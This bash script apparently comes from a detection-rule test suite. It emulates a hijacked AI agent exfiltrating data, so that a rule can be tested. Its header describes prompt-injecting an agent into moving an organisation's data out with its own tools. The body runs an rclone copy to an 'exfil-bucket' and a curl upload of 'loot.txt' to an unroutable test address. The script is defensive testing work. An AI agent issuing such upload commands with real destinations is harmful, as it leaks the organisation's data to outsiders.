#!/usr/bin/env bash
# aiexfil.sh - benign emulation of AI-enabled exfiltration by an agent account, for rule testing.
#
# What an attacker does: prompt-inject or hijack an AI agent and have it move an org's data out with
# the agent's own tools - rclone/aws s3 to a bucket, curl --upload-file to a drop. This does the
# harmless analogue: dummy scratch data, an UNROUTABLE TEST-NET destination (RFC 5737) with a short
# timeout, and no configured cloud remote, so nothing leaves the host - the transfer *attempt* in
# the argv is the signal. Fires only when run as an AGENT account (User in claude/redteam/lab), like
# the other agent_* scripts; the VM harness runs as alice, so it is proven by the engine
# golden/replay tests instead. See ./README.md.
#
# Imitates: rules/agent/agent_ai_enabled_exfil.yml - ATT&CK T1700 (AI-Enabled Exfiltration)
# Expected rules: agent_ai_enabled_exfil
set -u
work=$(mktemp -d) || exit 0
trap 'rm -rf "$work" 2>/dev/null' EXIT
echo 'dummy loot' > "$work/loot.txt"

# --- TTP: rclone copy to a remote bucket -> agent_ai_enabled_exfil (cloud_upload) ---
if command -v rclone >/dev/null 2>&1; then
	timeout 3 rclone copy "$work/loot.txt" remote:exfil-bucket >/dev/null 2>&1 || true
fi

# --- TTP: curl --upload-file to TEST-NET -> agent_ai_enabled_exfil (http_client + flag) ---
# 198.51.100.9 is TEST-NET-2 (RFC 5737): unroutable; the upload times out and nothing leaves.
if command -v curl >/dev/null 2>&1; then
	timeout 3 curl -s --max-time 2 --upload-file "$work/loot.txt" https://198.51.100.9/drop >/dev/null 2>&1 || true
fi

exit 0
